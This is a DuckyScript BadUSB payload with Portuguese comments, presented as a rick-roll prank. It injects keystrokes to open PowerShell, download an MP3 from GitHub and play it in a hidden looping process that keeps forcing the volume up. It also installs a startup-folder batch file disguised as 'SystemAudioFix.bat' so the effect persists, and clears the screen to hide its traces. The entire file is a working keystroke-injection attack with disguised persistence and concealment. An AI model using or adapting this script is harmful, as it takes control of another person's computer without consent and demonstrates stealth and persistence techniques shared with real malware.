DELAY 1250
GUI r
DELAY 700
STRING powershell
ENTER
DELAY 2000

REM Define a URL e limpa a tela imediatamente
STRING $Url = "https://raw.githubusercontent.com/jsfael/rbp-prank/main/rick%20roll/music.mp3"; cls
ENTER
DELAY 200

REM Define caminhos e limpa de novo
STRING $MusicDir = Join-Path $HOME "Music"; $LocalPath = Join-Path $MusicDir "audio.mp3"; $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; $BatPath = Join-Path $StartupPath "SystemAudioFix.bat"; cls
ENTER
DELAY 200

REM Cria a pasta em silêncio (o Out-Null evita mensagens na tela)
STRING if (!(Test-Path $MusicDir)) { New-Item -ItemType Directory -Path $MusicDir | Out-Null }
ENTER
DELAY 200

STRING Invoke-WebRequest -Uri $Url -OutFile $LocalPath
ENTER
REM Diminuí para 4000 (4s) porque o download do seu MP3 novo parece rápido
DELAY 4000

STRING $MusicCommand = "Add-Type -As presentationCore; `$m=New-Object System.Windows.Media.MediaPlayer; `$m.Open('$LocalPath'); while(`$m.NaturalDuration.HasTimeSpan -eq `$false){Sleep 1}; `$m.Volume=1; `$w=New-Object -Com WScript.Shell; while(1){ `$m.Play(); do { `$w.SendKeys([char]175); Sleep -m 500 } while (`$m.Position -lt `$m.NaturalDuration.TimeSpan); `$m.Position=[TimeSpan]::Zero }"
ENTER
DELAY 500

STRING Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile", "-Command", $MusicCommand
ENTER
DELAY 500

STRING $BatContent = "@echo off`nstart /min powershell.exe -WindowStyle Hidden -NoProfile -Command `"$MusicCommand`"`nexit"
ENTER
DELAY 200

STRING Set-Content -Path $BatPath -Value $BatContent
ENTER

REM O exit fecha tudo e não deixa rastro nenhum
STRING exit
ENTER
